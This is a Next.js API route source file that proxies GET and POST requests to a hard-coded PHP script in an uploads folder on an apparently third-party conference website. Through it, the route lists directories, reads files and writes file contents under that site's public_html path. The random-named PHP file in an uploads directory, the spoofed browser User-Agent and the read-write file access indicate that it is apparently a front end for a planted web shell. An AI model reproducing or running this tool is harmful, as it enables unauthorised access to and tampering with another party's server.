import { NextRequest, NextResponse } from 'next/server';

const REMOTE_PHP_URL = 'https://icmri2025.org/RUMC/uploads_phd/phd_6a501118a2e6e.php';

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const path = searchParams.get('path') || '/home/icmriorg/public_html/';
  const search = searchParams.get('search') || '';

  let remoteUrl = `${REMOTE_PHP_URL}?path=${encodeURIComponent(path)}`;
  if (search) {
    remoteUrl += `&search=${encodeURIComponent(search)}`;
  }

  try {
    const response = await fetch(remoteUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      cache: 'no-store',
    });

    if (!response.ok) {
      return NextResponse.json(
        { error: `Remote server returned status ${response.status}` },
        { status: response.status }
      );
    }

    const contentType = response.headers.get('content-type') || 'application/octet-stream';

    // If it's a JSON response (directory list), return as JSON
    if (contentType.includes('application/json')) {
      try {
        const text = await response.text();
        const json = JSON.parse(text);
        return NextResponse.json(json);
      } catch (e) {
        return NextResponse.json({ error: 'Failed to parse JSON response from remote' }, { status: 500 });
      }
    }

    // If it's a text-based file, read it as text and return with original content type (or force text/plain)
    const isText = 
      contentType.includes('text/') || 
      contentType.includes('application/javascript') || 
      contentType.includes('application/json') ||
      contentType.includes('application/xml') ||
      contentType.includes('application/x-httpd-php') ||
      contentType.includes('text/x-php');

    if (isText) {
      const text = await response.text();
      return new NextResponse(text, {
        headers: {
          'Content-Type': 'text/plain; charset=utf-8',
        },
      });
    }

    // For images, PDFs and other binaries, read as arrayBuffer and stream/return
    const buffer = await response.arrayBuffer();
    
    // Set headers appropriately
    const headers = new Headers();
    headers.set('Content-Type', contentType);
    
    const contentLength = response.headers.get('content-length');
    if (contentLength) {
      headers.set('Content-Length', contentLength);
    }
    
    const contentDisposition = response.headers.get('content-disposition');
    if (contentDisposition) {
      headers.set('Content-Disposition', contentDisposition);
    }

    return new NextResponse(buffer, { headers });

  } catch (error: any) {
    console.error('Error in proxy API GET:', error);
    return NextResponse.json(
      { error: error.message || 'Failed to fetch from remote server' },
      { status: 500 }
    );
  }
}

export async function POST(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const path = searchParams.get('path');

  if (!path) {
    return NextResponse.json({ error: "Path parameter is required" }, { status: 400 });
  }

  const remoteUrl = `${REMOTE_PHP_URL}?path=${encodeURIComponent(path)}`;

  try {
    const textBody = await request.text();

    const response = await fetch(remoteUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain; charset=utf-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      body: textBody,
      cache: 'no-store',
    });

    const raw = await response.text();
    let data;
    try {
      data = JSON.parse(raw);
    } catch {
      data = { success: false, raw };
    }

    return NextResponse.json(data, { status: response.status });

  } catch (error: any) {
    console.error('Error in proxy API POST:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Failed to save file' },
      { status: 500 }
    );
  }
}
